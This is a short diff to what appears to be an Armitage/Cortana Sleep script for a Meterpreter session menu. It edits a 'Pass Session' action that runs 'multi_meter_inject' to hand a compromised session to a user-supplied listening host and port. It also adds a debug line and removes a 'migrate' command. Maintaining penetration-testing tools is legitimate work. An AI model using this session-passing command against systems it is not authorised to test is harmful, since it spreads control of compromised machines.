@@ -195,12 +195,13 @@ sub showMeterpreterMenu {
 		}, $sid => "$sid"));
 
 		item($j, "Pass Session", 'S', lambda({
-			($host, $port) = split(':', ask("Send session to which listening host:port?"));
+			local('$host $port');
+			($host, $port) = split('[:\s]', ask("Send session to which listening host:port?"));
 			if ($host ne "" && $port ne "") {
 				oneTimeShow("run");
+				warn("$host and $port");
 				m_cmd($sid, "run multi_meter_inject -mr $host -p $port");
 			}
-			m_cmd($sid, "run migrate -f");
 		}, $sid => "$sid"));
 	}
 			
